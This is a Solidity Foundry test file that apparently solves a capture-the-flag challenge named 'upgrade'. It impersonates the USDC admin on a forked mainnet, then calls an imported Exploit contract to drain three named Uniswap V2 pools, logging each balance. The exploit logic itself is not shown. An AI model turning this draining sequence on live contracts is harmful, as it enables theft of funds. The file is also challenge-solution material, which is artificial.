// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import "forge-std/console.sol";
import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "@uniswap/v2-core/interfaces/IUniswapV2Pair.sol";

import "../upgrade/Setup.sol";
import "../upgrade/Exploit.sol";

contract UpgradeTest is DSTest {
    Vm public constant vm = Vm(HEVM_ADDRESS);
    FiatTokenProxyLike public constant USDC =
        FiatTokenProxyLike(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address public constant admin = 0x807a96288A1A408dBC13DE2b1d087d10356395d2;
    Setup setup;

    function setUp() public {
        setup = new Setup();
        vm.prank(admin);
        USDC.changeAdmin(address(setup));
        vm.prank(address(0));
        setup.upgrade();
    }

    function testSolved() public {
        Exploit exploit = new Exploit(address(setup));

        // works for --fork-block-number 12400000
        // if it should work for another block, you can always add more sources of flash loans
        exploit.buyUSDC{value: 100 ether}();
        exploit.exploit(
            IUniswapV2Pair(0x3041CbD36888bECc7bbCBc0045E3B1f144466f5f),
            true
        );
        console.log(
            "Balance after draining USDC/USDT:",
            USDC.balanceOf(address(setup))
        );

        exploit.buyUSDC{value: 100 ether}();
        exploit.exploit(
            IUniswapV2Pair(0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5),
            false
        );
        console.log(
            "Balance after draining DAI/USDC:",
            USDC.balanceOf(address(setup))
        );

        exploit.buyUSDC{value: 200 ether}();
        exploit.exploit(
            IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc),
            true
        );
        console.log(
            "Balance after draining USDC/WETH:",
            USDC.balanceOf(address(setup))
        );

        assertTrue(setup.isSolved());
    }
}
